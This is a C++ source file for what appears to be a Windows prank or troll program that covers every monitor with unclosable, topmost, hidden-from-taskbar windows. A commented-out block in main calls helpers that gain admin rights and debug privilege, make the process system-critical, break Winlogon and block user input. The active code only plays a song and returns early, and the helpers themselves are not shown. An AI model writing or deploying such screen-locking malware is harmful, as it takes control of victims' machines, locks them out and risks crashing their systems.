//#include "CoverImage.h"
#include "MysterySong.h"
#include "EZAudioClient.h"
#include "EZProgram.h"
#include "Helper.h"
#include "SysControl.h"
#include <thread>
#include <iostream>
#include <vector>

LONGLONG timerStartTime = 0;
void TimerStart() {
	QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&timerStartTime));
}
void TimerEnd() {
	LONGLONG timeNow = 0;
	QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&timeNow));

	LONGLONG deltaTime = (timeNow - timerStartTime);
	FLOAT deltaSeconds = deltaTime / 10000000.0f;

	std::cout << "Timer was running for: " << deltaTime << " ticks or " << deltaSeconds << " seconds." << std::endl;
}

void Update(EZ::Program* program) {
	ID2D1Bitmap* mysteryImage = *program->GetUserDataAs<ID2D1Bitmap*>();
	D2D1_SIZE_U rendererSize = program->GetRenderer()->GetSize();
	D2D1_RECT_L rendererRect = EZ::RectL(0, 0, rendererSize.width, rendererSize.height);
	program->GetRenderer()->DrawBitmap(mysteryImage, rendererRect);
}

UINT32 OpenWindowCount = 0;
void CoverMonitor(HMONITOR monitor) {
	OpenWindowCount++;
	std::thread monitorThread([monitor]() {
		EZ::ClassSettings classSettings = { };
		classSettings.ThisThreadOnly = TRUE;
		classSettings.NoCloseOption = TRUE;

		MONITORINFO monitorInfo;
		monitorInfo.cbSize = sizeof(MONITORINFO);
		GetMonitorInfo(monitor, &monitorInfo);

		EZ::WindowSettings windowSettings = { };
		windowSettings.HideInTaskbar = TRUE;
		windowSettings.Title = L"Mystery Experience Host Window";
		windowSettings.LaunchHidden = TRUE;
		windowSettings.TopMost = TRUE;
		windowSettings.StylePreset = EZ::WindowStylePreset::Boarderless;
		windowSettings.InitialX = monitorInfo.rcMonitor.left;
		windowSettings.InitialY = monitorInfo.rcMonitor.top;
		windowSettings.InitialWidth = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
		windowSettings.InitialHeight = monitorInfo.rcMonitor.bottom - monitorInfo.rcMonitor.top;

		EZ::RendererSettings rendererSettings = { };
		rendererSettings.UseVSync = TRUE;
		rendererSettings.OptimizeForSingleThread = TRUE;

		ID2D1Bitmap* mysteryImage = nullptr;

		EZ::ProgramSettings programSettings = { };
		programSettings.IgnoreWMClose = TRUE;
		programSettings.PreformanceLogInterval = 60;
		programSettings.UpdateCallback = Update;
		programSettings.UserData = &mysteryImage;

		EZ::Program* program = new EZ::Program(programSettings, classSettings, windowSettings, rendererSettings);

		//mysteryImage = program->GetRenderer()->LoadBitmap(CoverImage_Asset);

		program->Run();

		delete program;

		OpenWindowCount--;
		});
	monitorThread.detach();
}

struct MonitorList {
	DWORD length;
	HMONITOR* list;
};
BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData) {
	std::vector<HMONITOR>* monitors = reinterpret_cast<std::vector<HMONITOR>*>(dwData);

	monitors->push_back(hMonitor);

	return TRUE;
}
MonitorList GetMonitors() {
	std::vector<HMONITOR>* monitors = new std::vector<HMONITOR>();
	EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, reinterpret_cast<LPARAM>(monitors));

	DWORD length = monitors->size();
	HMONITOR* monitorsArray = new HMONITOR[length];
	for (DWORD i = 0; i < length; ++i) {
		monitorsArray[i] = (*monitors)[i];
	}

	delete monitors;

	return { length, monitorsArray };
}

int main() {
	/*
	if (!IsAdmin()) {
		RelaunchAsAdmin();
		return 0;
	}

	if (!HasUIAccess()) {
		RelaunchWithUIAccess();
		return 0;
	}

	TakeSEDebugPrivilege();
	MakeSystemCritical();

	TakeSEDebugPrivilege();
	BreakWinlogon();

	BlockInput();
	*/

	EZ::PlayWAVExclusive(MysterySong_Asset);
	return 0;

	MonitorList monitors = GetMonitors();

	for (DWORD i = 0; i < monitors.length; i++)
	{
		CoverMonitor(monitors.list[i]);
	}

	while (OpenWindowCount > 0) {}

	delete[] monitors.list;
	return 0;
}